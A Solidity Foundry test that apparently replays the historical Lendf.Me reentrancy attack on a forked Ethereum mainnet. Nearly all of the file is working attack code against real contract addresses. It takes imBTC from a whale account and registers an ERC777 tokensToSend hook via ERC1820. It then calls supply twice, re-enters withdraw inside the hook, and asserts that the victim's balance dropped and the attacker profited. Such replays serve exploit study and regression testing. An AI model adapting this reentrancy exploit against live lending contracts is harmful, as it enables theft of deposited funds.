// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../helpers/BaseForkTest.t.sol";

interface IERC20ApproveTransfer {
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address to, uint256 amount) external returns (bool);
}

interface IERC1820RegistryLike {
    function setInterfaceImplementer(address account, bytes32 interfaceHash, address implementer) external;
}

interface ILendfMeMoneyMarket {
    function supply(address asset, uint256 amount) external returns (uint256);
    function withdraw(address asset, uint256 requestedAmount) external returns (uint256);
}

contract LendfMeReplayTest is BaseForkTest {
    address internal constant LENDFME_MARKET = 0x0eEe3E3828A45f7601D5F54bF49bB01d1A9dF5ea;
    address internal constant IMBTC_WHALE = 0xA9BF70A420d364e923C74448D9D817d3F2A77822;
    IERC20ApproveTransfer internal constant IMBTC =
        IERC20ApproveTransfer(0x3212b29E33587A00FB1C83346f5dBFA69A458923);
    IERC1820RegistryLike internal constant ERC1820 =
        IERC1820RegistryLike(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24);

    bytes32 internal constant TOKENS_SENDER_INTERFACE_HASH =
        0x29ddb589b1fb5fc7cf394961c1adf5f8c6454761adf795e67fe149f658abe895;
    uint256 internal constant LENDFME_ATTACK_BLOCK = 9_899_725;

    function test_LendfMeReplayMetadata() public pure {
        assertEq(LENDFME_ATTACK_BLOCK, 9_899_725, "fork block drift");
    }

    function test_LendfMeReplay() public {
        string memory rpcUrl = vm.envOr("ETH_RPC_URL", string(""));
        if (bytes(rpcUrl).length == 0) {
            return;
        }

        _initFork(rpcUrl, LENDFME_ATTACK_BLOCK);
        _assertForkInitialized();

        vm.prank(IMBTC_WHALE);
        IMBTC.transfer(address(this), IMBTC.balanceOf(IMBTC_WHALE));

        IMBTC.approve(LENDFME_MARKET, type(uint256).max);
        ERC1820.setInterfaceImplementer(address(this), TOKENS_SENDER_INTERFACE_HASH, address(this));

        uint256 victimBalanceBefore = IMBTC.balanceOf(LENDFME_MARKET);
        uint256 attackerBalanceBefore = IMBTC.balanceOf(address(this));

        uint256 thisBalance = attackerBalanceBefore;
        if (thisBalance > victimBalanceBefore + 1) {
            thisBalance = victimBalanceBefore + 1;
        }

        ILendfMeMoneyMarket(LENDFME_MARKET).supply(address(IMBTC), thisBalance - 1);
        ILendfMeMoneyMarket(LENDFME_MARKET).supply(address(IMBTC), 1);
        ILendfMeMoneyMarket(LENDFME_MARKET).withdraw(address(IMBTC), type(uint256).max);

        uint256 victimBalanceAfter = IMBTC.balanceOf(LENDFME_MARKET);
        uint256 attackerBalanceAfter = IMBTC.balanceOf(address(this));

        assertLt(victimBalanceAfter, victimBalanceBefore, "victim balance did not decrease");
        assertGt(attackerBalanceAfter, attackerBalanceBefore, "attacker did not profit");
    }

    function tokensToSend(
        address,
        address,
        address,
        uint256 amount,
        bytes calldata,
        bytes calldata
    ) external {
        if (amount == 1) {
            ILendfMeMoneyMarket(LENDFME_MARKET).withdraw(address(IMBTC), type(uint256).max);
        }
    }
}
